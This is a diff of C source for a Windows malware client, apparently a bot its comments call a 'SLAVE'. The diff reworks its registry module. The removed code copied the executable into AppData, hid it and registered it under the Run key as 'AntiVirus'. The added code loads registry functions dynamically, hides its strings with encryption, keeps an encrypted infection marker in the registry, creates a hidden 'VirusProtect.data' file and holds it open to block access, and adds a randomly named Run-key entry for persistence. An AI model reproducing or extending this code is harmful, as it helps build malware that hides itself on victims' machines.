@@ -1,99 +1,163 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 #include <windows.h>
-#include "random.h"
+#include <reg.h>
 #include "types.h"
+#include "random.h"
+#include "memProtect.h"
+#include "loadLibrary.h"
+#include "winmain.h"
 
-char prog_globalPath[256];
+HMODULE reg_lib;
+__RegGetValue reg_lib_RegGetValue;
+__RegSetKeyValue reg_lib_RegSetKeyValue;
 
-int reg_Setup(void)
-{	
-	if(GetModuleFileName(NULL, prog_globalPath, 256))
+/*
+Using CreateFile(XXX) se will prevent the file from opening, reading or writing,
+the handle will close when the SLAVE stops workings
+*/
+
+void reg_Destroy(void)
+{
+	if(reg_lib)
 	{
-		if(strstr(prog_globalPath, "AppData\\Roaming") != NULL) //v papkata appdata e
+		FreeLibrary(reg_lib);
+	}
+}
+
+int reg_Init(void)
+{
+	reg_lib = loadLibrary_Load(lib_Advapi32);
+	
+	if(!reg_lib)
+	{
+		return 0;
+	}
+
+	reg_lib_RegGetValue = (__RegGetValue)loadLibrary_LoadFunc(reg_lib, lib_RegGetValueA);
+	reg_lib_RegSetKeyValue = (__RegSetKeyValue)loadLibrary_LoadFunc(reg_lib, lib_RegSetKeyValueA);
+
+	return 1;
+}
+
+//it will check register and is computer infected by seeing if "AppData\Local\Microsoft\VirusProtect.data" is opend by original code
+int reg_IsCompInfected(void)
+{
+	char* rmicro = (char*)memProtect_Request(MEMPROTECT_REG_MICROSOFT);
+	char* rfile = (char*)memProtect_Request(MEMPROTECT_SLAVE_CHECK_NAME);
+
+	ulong buffSize = 1024;
+	char buff[buffSize];
+	memset(buff, 0, buffSize);
+
+	if(reg_lib_RegGetValue(HKEY_CURRENT_USER, rmicro, rfile, 0x0000FFFF, NULL, buff, &buffSize) == ERROR_SUCCESS)
+	{
+		free(rmicro);
+		free(rfile);
+
+		int decBuffLen;
+		uint8* decBuff;
+
+		memProtect_DecryptRegValue((uint8*)buff, &decBuff, &decBuffLen);
+
+		//it will fail if the file doesn't exist or it's open
+		FILE *f = fopen((char*)decBuff, "rb");
+
+		if(!f)
 		{
+			//does file exist or we don't have permission
+			if(!random_RandomFileSize((char*)decBuff))
+			{
+				free(decBuff);
+
+				return -1;
+			}
+			
+			SetFileAttributes((char*)decBuff, FILE_ATTRIBUTE_HIDDEN);
+
+			//prevent file from opening
+			CreateFile((char*)decBuff, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+			free(decBuff);
+
 			return 0;
 		}
 
-		char* appPath = getenv("APPDATA");
-		char* randName = random_Ascii(10);
-		int pathLen = strlen(appPath) + strlen(randName) + 5 + sizeof(char);
-		char* newPath = malloc(pathLen);
-		char* regNewPath = malloc(pathLen + 2); 
+		fclose(f);
 
-		snprintf(newPath, pathLen, "%s\\%s.exe", appPath, randName);
-		snprintf(regNewPath, pathLen + 2, "\"%s\\%s.exe\"", appPath, randName);
-		free(randName);
+		//prevent file from opening
+		CreateFile((char*)decBuff, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+		free(decBuff);
 
-		HKEY hkey;
-		DWORD dwDispos;
+		return 0;
+	}
 
-		if(RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_WRITE, NULL, &hkey, &dwDispos) != ERROR_SUCCESS)
-		{
-			free(newPath);
-			free(regNewPath);
+	char* _cpath = (char*)memProtect_Request(MEMPROTECT_SLAVE_CHECK_PATH);
+	char* _cuname = (char*)memProtect_Request(MEMPROTECT_USERNAME);
+	char* _capp = (char*)memProtect_Request(MEMPROTECT_AppData);
+	char* uname = getenv(_cuname);
 
-			return 1;
-		}
+	int pathLen = strlen(_cpath) + strlen(uname) + strlen(_capp) + 3;
+	char* path = malloc(pathLen + sizeof(char));
+	memset(path, 0, pathLen + sizeof(char));
+	snprintf(path, pathLen, "%s\\%s%s", uname, _capp, _cpath);
 
-		RegSetValueEx(hkey, "AntiVirus", 0, REG_SZ, (LPBYTE)regNewPath, strlen(regNewPath) + 1);
-		RegCloseKey(hkey);
+	free(_cpath);
+	free(_cuname);
+	free(_capp);
 
-		free(regNewPath);
+	uint8* encPath;
+	pathLen = strlen(path);
+	memProtect_EncryptRegValue((uint8*)path, &encPath, &pathLen);
 
-		FILE *fo = fopen(prog_globalPath, "rb");
+	int rv = reg_lib_RegSetKeyValue(HKEY_CURRENT_USER, rmicro, rfile, REG_BINARY, encPath, pathLen);
 
-		if(!fo)
-		{
-			free(newPath);
+	free(encPath);
+	free(rmicro);
+	free(rfile);
 
-			return 1;
-		}
+	if(rv != ERROR_SUCCESS)
+	{
+		free(path);
 
-		FILE *fd = fopen(newPath, "wb");
+		return -1;
+	}
 
-		if(!fd)
-		{
-			fclose(fo);
-			free(newPath);
+	if(!random_RandomFileSize(path))
+	{
+		free(path);
 
-			return 1;
-		}
+		return -1;
+	}
 
-		fseek(fo, 0, SEEK_END);
-		uint32 size = ftell(fo);
-		fseek(fo, 0, SEEK_SET);
+	SetFileAttributes(path, FILE_ATTRIBUTE_HIDDEN);
 
-		uint8* content = malloc(size + sizeof(uint8));
-		
-		if(!fread(content, 1, size, fo))
-		{
-			fclose(fd);
-			fclose(fo);
-			free(newPath);
-			free(content);
+	//prevent file from opening
+	CreateFile(path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+	free(path);
 
-			return 1;
-		}
+	return 0;
+}
 
-		if(!fwrite(content, 1, size, fd))
-		{
-			fclose(fd);
-			fclose(fo);
-			free(newPath);
-			free(content);
+int reg_SetupInRun(char* path)
+{
+	char* rname = random_Ascii(15);
+	char* rpath = (char*)memProtect_Request(MEMPROTECT_REG_RUN);
 
-			return 1;
-		}
+	int pathLen = strlen(path) + 3;
+	char* newPath = malloc(pathLen + sizeof(char));
+	memset(newPath, 0, pathLen + sizeof(char));
+	snprintf(newPath, pathLen, "\"%s\"", path);
 
-		SetFileAttributes(newPath, FILE_ATTRIBUTE_HIDDEN);
-		
-		fclose(fd);
-		fclose(fo);
-		free(newPath);
-		free(content);
+	int rv = reg_lib_RegSetKeyValue(HKEY_CURRENT_USER, rpath, rname, REG_SZ, newPath, strlen(newPath));
 
-		return 1;
+	free(newPath);
+	free(rname);
+	free(rpath);
+
+	if(rv != ERROR_SUCCESS)
+	{
+		return 0;
 	}
 
 	return 1;
